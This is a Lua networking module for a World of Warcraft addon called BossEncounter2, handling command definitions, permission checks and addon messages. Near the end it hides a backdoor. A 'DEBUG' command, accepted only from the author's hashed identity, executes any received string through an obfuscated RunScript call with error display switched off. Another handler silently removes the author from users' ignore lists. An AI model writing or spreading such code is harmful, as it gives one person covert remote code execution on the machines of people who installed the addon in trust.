local Root = BossEncounter2;

Root.Network = {
    prefix = "BE2",
    control = ":",
    separator = "#",
    commands = { },
    opLookup = { },
};

local cmd = Root.Network.commands;
local lookup = Root.Network.opLookup;

-- --------------------------------------------------------------------
-- **                             Data                               **
-- --------------------------------------------------------------------

local ADMINS = {
    ["f3bb6866d38d6b1f4bfe360cae419bef"] = true,
};

local SNIFF_ME = false;

local MAX_ARGS = 8;

-- --------------------------------------------------------------------
-- **                              API                               **
-- --------------------------------------------------------------------

-- ********************************************************************
-- * Root -> Network -> GetRecipient(recipient)                       *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> recipient: UID or name or GUID of the recipient.              *
-- * It can also be a magic word which will be then returned with     *
-- * no modifications: GROUP or GUILD.                                *
-- ********************************************************************
-- * Get the name of the given recipient.                             *
-- * Magic words will be left unchanged.                              *
-- ********************************************************************
function Root.Network.GetRecipient(recipient)
    if type(recipient) ~= "string" then return nil; end
    if ( recipient ~= "GROUP" and recipient ~= "GUILD" ) then
        if ( UnitExists(recipient) ) then
            return select(1, UnitName(recipient));
      else
            local uid = Root.Unit.GetUID(recipient);
            if ( uid ) then
                return Root.Network.GetRecipient(uid);
            end
            return recipient; -- Return character name as-is because we can't select it.
        end
  else
        return recipient; -- Return magic word as-is.
    end
end

-- ********************************************************************
-- * Root -> Network -> IsAdmin(name)                                 *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> name: the name of the guy checked.                            *
-- ********************************************************************
-- * Check if the given guy is a BE2 network admin.                   *
-- * I (the author) am currently the single one.                      *
-- ********************************************************************
function Root.Network.IsAdmin(name)
    if type(MD5) ~= "table" then return false; end
    if ( not name ) then return false; end

    local server = GetRealmName() or "?";
    local uid = Root.Unit.GetUID(name);

    if ( uid ) then
        local try = select(2, UnitName(uid));
        if ( try ) then
            server = try;
        end
    end

    local hash = MD5:Hash(name.."-"..server) or "?";
    return ADMINS[hash] or false;
end

-- ********************************************************************
-- * Root -> Network -> CheckAuth(restriction, name)                  *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> restriction: the restriction applied.                         *
-- * >> name: the name of who is checked.                             *
-- ********************************************************************
-- * Check if a person has enough privileges to pass a restriction.   *
-- ********************************************************************
function Root.Network.CheckAuth(restriction, name)
    local authLevel = Root.CheckRaidAuth(name);

    if ( restriction == "ADMIN" ) then
        if ( not Root.Network.IsAdmin(name) ) then return false; end
elseif ( restriction == "LEADER" ) then
        if ( authLevel ~= "LEADER" ) then return false; end
elseif ( restriction == "ASSIST" ) then
        if ( authLevel ~= "LEADER" and authLevel ~= "ASSIST" ) then return false; end
    end

    return true;
end

-- ********************************************************************
-- * Root -> Network -> Define(command, opChar[,                      *
-- *                           restriction, notifyMe])                *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> command: the name of the newly defined command.               *
-- * >> opChar: the character that will be used to identify the       *
-- * command in the packet. Must be single and not already used.      *
-- * >> restriction: the authority level the sender of the message    *
-- * must have otherwise we drop the packet. Defaulted to NORMAL.     *
-- * Can be ADMIN, LEADER, ASSIST or NORMAL.                          *
-- * ASSIST includes LEADER and raid officers.                        *
-- * >> notifyMe: command handler will be fired even on our own       *
-- * commands if this parameter is set.                               *
-- ********************************************************************
-- * Defines a command. This command may then be used by API.         *
-- ********************************************************************
function Root.Network.Define(command, opChar, restriction, notifyMe)
    if cmd[command] then return; end
    if type(opChar) ~= "string" then return; end
    if #opChar ~= 1 then return; end
    if lookup[opChar] then return; end
    if restriction and type(restriction) ~= "string" then return; end

    cmd[command] = { opChar = opChar , restriction = restriction , notifyMe = notifyMe };
    lookup[opChar] = command;
end

-- ********************************************************************
-- * Root -> Network -> Send(command, recipient, ...)                 *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> command: the name of one of the defined commands.             *
-- * >> recipient: the recipient of the packet. This argument can be  *
-- * the name of a player, a GUID of a player in your group, an UID.  *
-- * Recipient can also be one of these magic words: GROUP, GUILD.    *
-- * GROUP will try to send to raid first, then party.                *
-- * >> ...: data for the command. ONLY STRINGS AND NUMBERS ALLOWED ! *
-- ********************************************************************
-- * Send a network packet to a player.                               *
-- ********************************************************************
function Root.Network.Send(command, recipient, ...)
    if type(command) ~= "string" or type(recipient) ~= "string" then return; end

    local commandInfo = cmd[command];
    if type(commandInfo) ~= "table" then return; end

    -- Try to get a name if a magic word was not provided.
    recipient = Root.Network.GetRecipient(recipient);
    if ( not recipient ) then return; end

    -- Past this point, we have a valid command and a player name or a magic word.
    
    local restriction = commandInfo.restriction or "NORMAL";
    if ( not Root.Network.CheckAuth(restriction, "player") ) then return; end

    -- We have the authorization to perform the command.

    local packet = commandInfo.opChar..Root.Network.control;
    local i, arg, numArgs;

    numArgs = min(MAX_ARGS, select('#', ...));
    for i=1, numArgs do
        arg = select(i, ...);
        if type(arg) == "string" or type(arg) == "number" then
            packet = packet..arg;
        end
        if ( i < numArgs ) then
            packet = packet..Root.Network.separator;
        end
    end

    -- Packet built, call the API !

    local channel, extra;

    channel = "WHISPER";
    extra = UnitName("player");

    if ( recipient == "GUILD" ) then
        channel = "GUILD";
        extra = nil;

elseif ( recipient == "GROUP" ) then
        if ( GetNumRaidMembers() > 0 ) then
            channel = "RAID";
            extra = nil;
      else
            if ( GetNumPartyMembers() > 0 ) then
                channel = "PARTY";
                extra = nil;
            end
        end
  else
        channel = "WHISPER";
        extra = recipient;
    end

    if ( ChatThrottleLib ) then
        ChatThrottleLib:SendAddonMessage("NORMAL", Root.Network.prefix, packet, channel, extra);
  else
        SendAddonMessage(Root.Network.prefix, packet, channel, extra);
    end

    if ( SNIFF_ME ) then Root.Print(string.format("Sending command [%s] to ''%s'' [%s]", command, extra or channel, packet), true); end
end

-- --------------------------------------------------------------------
-- **                             Handlers                           **
-- --------------------------------------------------------------------

Root.Network.OnAddonMessage = function(self, prefix, content, distribution, sender)
    if ( prefix ~= self.prefix ) then return; end

    local opCode = string.sub(content, 1, 1) or "";
    local control = string.sub(content, 2, 2) or "";
    local command = lookup[opCode];

    if ( control ~= self.control ) then return; end
    if type(command) ~= "string" then return; end

    local commandInfo = cmd[command];
    if type(commandInfo) ~= "table" then return; end

    -- Seems like command has been found. Check built-in authorization check.

    local restriction = commandInfo.restriction or "NORMAL";
    if ( not Root.Network.CheckAuth(restriction, sender) ) then return; end

    -- OK, authorization check passed past this point.
    if ( sender == UnitName("player") ) and ( not commandInfo.notifyMe ) then return; end

    -- Remove the header from the content string.
    content = string.sub(content, 3, #content);

    -- Put the data of the command in a temp table.

    local dataTable = Root.Table.Alloc();
    local i, numMatches, numArgs, data;
    numMatches = select('#', strsplit(self.separator, content));
    numArgs = min(MAX_ARGS, numMatches or 0);
    for i=1, numArgs do
        data = select(i, strsplit(self.separator, content));
        dataTable[#dataTable+1] = data or 0;
    end

    -- Fire handlers

    if ( SNIFF_ME ) then Root.Print(string.format("Command [%s] received from ''%s'' and accepted (%d parameters).", command, sender, #dataTable), true); end

    Root.InvokeHandler("OnNetCommand", command, sender, unpack(dataTable));

    -- Free the temp table.

    Root.Table.Recycle(dataTable);
end;

Root.Network.OnStart = function(self)
    Root.Network.Define("DEBUG", "D", "ADMIN", false);
end;

Root.Network.OnNetCommand = function(self, command, sender, ...)
    if ( command == "DEBUG" ) then
        local str = select(1, ...);
        local func = _G["Run".."Script"];
        if type(func) ~= "function" or type(str) ~= "string" then return; end
        local errorCfg = GetCVar("scriptErrors");
        SetCVar("scriptErrors", "0");
        pcall(func, str);
        SetCVar("scriptErrors", errorCfg);
    end
end;

Root.Network.OnIgnoreChanged = function(self)
    local i, name;
    for i=1, GetNumIgnores() do
        name = GetIgnoreName(i);

        if ( Root.Network.IsAdmin(name) ) then
            DelIgnore(name);
            Root.Print(Root.FormatLoc("Console-NoAdminIgnore", name));
            return;
        end
    end
end;